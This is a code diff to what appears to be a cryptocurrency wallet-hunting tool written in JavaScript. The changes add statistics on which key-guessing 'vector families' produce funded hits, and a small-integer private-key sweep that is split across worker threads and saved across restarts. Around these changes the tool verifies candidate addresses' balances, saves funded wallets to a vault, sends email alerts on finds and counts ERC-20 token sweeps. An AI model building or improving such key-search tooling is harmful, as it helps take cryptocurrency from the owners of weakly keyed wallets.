@@ -1886,6 +1886,7 @@ function enqueueLiveVerification(item, opts = {}) {
   }
   pendingVerificationQueue.push(item);
   verificationStats.queued++;
+  bumpFamily(item.vectorKey, 'leads');
   while (pendingVerificationQueue.length > VERIFY_QUEUE_LIMIT) {
     const dropped = pendingVerificationQueue.shift();
     verificationStats.dropped++;
@@ -2018,14 +2019,17 @@ async function runVerificationPump() {
         it.forceEmit = true;
         if (Number(it.balanceUsd || 0) > 0) {
           verificationStats.confirmedFunded++;
+          bumpFamily(it.vectorKey, 'confirmedFunded');
           saveFoundWalletToVault(it);
           saveEverHeldWalletToVault(it);
           dispatchWalletFoundSmtpAlert(it, false).catch(() => {});
         } else if (it.everHeldCrypto) {
           verificationStats.confirmedEverHeld++;
+          bumpFamily(it.vectorKey, 'confirmedEverHeld');
           saveEverHeldWalletToVault(it);
         } else {
           verificationStats.confirmedEmpty++;
+          bumpFamily(it.vectorKey, 'confirmedEmpty');
           markWalletScannedEmpty(it);
         }
         recordBrainFeedback(it, true);
@@ -2033,6 +2037,7 @@ async function runVerificationPump() {
         if (it.everHeldCrypto || Number(it.balanceUsd || 0) > 0) workerReadyQueue.unshift(it);
       } else {
         verificationStats.unanswered++;
+        bumpFamily(it.vectorKey, 'unanswered');
         pendingVerificationSeen.delete(key);
         const previousAttempts = Number(it.attempts || 0);
         // If no chain answered for the *whole batch*, the network is down or
@@ -2263,6 +2268,18 @@ let serverDaemonScanned = 0;
 let multiIndexAddressesChecked = 0;
 let evmNonceChecksCount = 0;
 let erc20TokensSweptCount = 0;
+// Finite-family progress: raw small-integer private keys (1..N), partitioned
+// across hunter workers and persisted so restarts never repeat the sweep.
+let smallIntCursor = 0;
+let smallIntCheckedTotal = 0;
+const smallIntWorkerCursors = new Map();
+// Per-family lead/verdict stats — which vector family actually pays.
+const familyStats = {};
+function bumpFamily(vKey, field) {
+  const k = vKey || 'unknown';
+  const e = familyStats[k] || (familyStats[k] = { leads: 0, confirmedFunded: 0, confirmedEverHeld: 0, confirmedEmpty: 0, unanswered: 0 });
+  e[field] = (e[field] || 0) + 1;
+}
 
 function saveCheckpoint() {
   try {
@@ -2280,6 +2297,8 @@ function saveCheckpoint() {
       liveRpcVerifiedCount,
       liveRpcAddressesChecked,
       liveRpcRequestsSent,
+      smallIntCursor,
+      smallIntCheckedTotal,
       brainGeneration: brainState.generation,
       brainEpochs: brainState.epochs
     };
@@ -2303,6 +2322,8 @@ for (const cpCandidate of [PERSISTENT_CHECKPOINT_FILE, CHECKPOINT_FILE]) {
       if (typeof cp.liveRpcVerifiedCount === 'number') liveRpcVerifiedCount = Math.max(liveRpcVerifiedCount, cp.liveRpcVerifiedCount);
       if (typeof cp.liveRpcAddressesChecked === 'number') liveRpcAddressesChecked = Math.max(liveRpcAddressesChecked, cp.liveRpcAddressesChecked);
       if (typeof cp.liveRpcRequestsSent === 'number') liveRpcRequestsSent = Math.max(liveRpcRequestsSent, cp.liveRpcRequestsSent);
+      if (typeof cp.smallIntCursor === 'number') smallIntCursor = Math.max(smallIntCursor, cp.smallIntCursor);
+      if (typeof cp.smallIntCheckedTotal === 'number') smallIntCheckedTotal = Math.max(smallIntCheckedTotal, cp.smallIntCheckedTotal);
     }
   } catch (_) {}
 }
@@ -2347,7 +2368,7 @@ function saveApiKeysConfig() {
    file instead of guesswork. Everything here is read-only telemetry: it never
    invents a balance, never promotes a lead and never touches a vault.
    ──────────────────────────────────────────────────────────────────────── */
-const APP_VERSION = '2.7.1';
+const APP_VERSION = '2.7.2';
 const DIAG_LOG_FILE = path.join(PERSISTENT_STATE_DIR, 'diagnostics.log');
 const DIAG_REPORT_FILE = path.join(PERSISTENT_STATE_DIR, 'DIAGNOSTIC_REPORT.txt');
 const DIAG_BOOT_AT = Date.now();
@@ -2768,7 +2789,10 @@ function diagSnapshot() {
       confirmedEverHeld: verificationStats.confirmedEverHeld,
       confirmedEmpty: verificationStats.confirmedEmpty,
       unanswered: verificationStats.unanswered,
-      falsePositiveRate: Number(fundedBloomMeta.falsePositiveRate || 0)
+      falsePositiveRate: Number(fundedBloomMeta.falsePositiveRate || 0),
+      smallIntNext: smallIntCursor,
+      smallIntChecked: smallIntCheckedTotal,
+      families: familyStats
     },
     chains,
     coverage: {
@@ -2907,6 +2931,14 @@ function diagnosticsReportText(snapshot) {
   L.push(`  matches queued       ${s.funnel.leadsQueued.toLocaleString()} leads · bloom FP ${(s.funnel.falsePositiveRate * 100).toFixed(3)}%`);
   L.push(`  verdicts             ${s.funnel.verdicts.toLocaleString()} checked · ${s.funnel.confirmedEmpty.toLocaleString()} empty · ${s.funnel.unanswered.toLocaleString()} unanswered`);
   L.push(`  confirmed            ${s.funnel.confirmedFunded.toLocaleString()} funded · ${s.funnel.confirmedEverHeld.toLocaleString()} ever-held`);
+  L.push(`  small-int sweep      through key ${s.funnel.smallIntNext.toLocaleString()} · ${s.funnel.smallIntChecked.toLocaleString()} keys checked (finite family)`);
+  const famRows = Object.entries(s.funnel.families || {}).sort((a, b) => (b[1].leads || 0) - (a[1].leads || 0));
+  if (famRows.length) {
+    L.push('  by family            leads / empty / funded / ever-held');
+    for (const [fk, fv] of famRows) {
+      L.push(`    ${String(fk).padEnd(13)} ${String(fv.leads || 0).padStart(9)} / ${String(fv.confirmedEmpty || 0).padStart(8)} / ${String(fv.confirmedFunded || 0).padStart(4)} / ${String(fv.confirmedEverHeld || 0).padStart(4)}`);
+    }
+  }
   L.push('  Most leads are bloom false positives and verify empty — that is expected.');
   L.push('  A confirmed funded wallet is astronomically rare; zero finds over hours');
   L.push('  or days is the statistical norm, not a failure of the scanner.');
@@ -3806,6 +3838,8 @@ function spawnHunterWorker(wId) {
       sharedBloomBuffer,
       sharedSessionBloomBuffer,
       sharedFundedBloomBuffer,
+      workerCount: WORKER_THREAD_COUNT,
+      smallIntCursor,
       initialTargets: Array.from(targetAddressMap.keys())
     }
   });
@@ -3824,6 +3858,15 @@ function spawnHunterWorker(wId) {
       multiIndexAddressesChecked += extraScreened * 4;
       apiQuotaSavedCount += extraScreened * 4;
       if (extraScreened > 0) scanLastProgressAt = Date.now();
+      const siNext = Math.max(0, Number(msg.smallIntNext || 0));
+      const siChecked = Math.max(0, Number(msg.smallIntChecked || 0));
+      if (siNext > 0) smallIntWorkerCursors.set((msg.workerId != null ? msg.workerId : wId), siNext);
+      if (siChecked > 0) smallIntCheckedTotal += siChecked;
+      if (smallIntWorkerCursors.size) {
+        let minFrontier = Infinity;
+        for (const v of smallIntWorkerCursors.values()) if (v < minFrontier) minFrontier = v;
+        if (minFrontier !== Infinity) smallIntCursor = Math.max(smallIntCursor, minFrontier - WORKER_THREAD_COUNT);
+      }
 
       for (const hit of burstHitsArr) {
         processIncomingDaemonCandidate(hit, true);
